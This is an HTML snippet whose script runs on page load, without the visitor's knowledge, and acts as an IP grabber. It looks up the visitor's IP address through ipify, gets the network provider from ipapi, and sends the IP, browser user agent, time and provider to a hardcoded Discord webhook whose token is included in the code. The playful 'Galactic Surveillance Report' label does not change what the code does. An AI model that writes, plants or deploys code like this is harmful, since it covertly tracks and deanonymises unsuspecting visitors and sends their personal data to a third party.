    <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <script>
    function getDeviceInfo() {
      const info = {
        ipAddress: '',
        browser: navigator.userAgent,
        time: new Date().toLocaleString(),
        networkProvider: 'Unknown Galactic Phenomenon', // Default in case we can't fetch the real deal
      };

      fetch('https://api64.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
          info.ipAddress = data.ip;
          return fetch(`https://ipapi.co/${data.ip}/json/`); // Fetch more details including network provider
        })
        .then(response => response.json())
        .then(data => {
          info.networkProvider = data.org || info.networkProvider; // Use fetched network provider or stick to the default
          sendToDiscord(info);
        })
        .catch(error => console.error('Oops, something went wrong:', error));
    }

    function sendToDiscord(info) {
      const webhookURL = 'https://discord.com/api/webhooks/1194952054477688832/V4_kFj2oz5NF2Jey5-Vet9sqtSdZAq8HFYm-zuytKmb2GSikgPRmSQ8ddd7-he_-rry8';
      const payload = {
        content: `\`\`\`Incoming Galactic Surveillance Report:
          IP Address: ${info.ipAddress}
          Browser: ${info.browser}
          Time: ${info.time}
          Network Provider: ${info.networkProvider}\`\`\``,
      };

      fetch(webhookURL, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload),
      });
    }

    // Call getDeviceInfo() when the page loads
    window.onload = getDeviceInfo;
  </script>
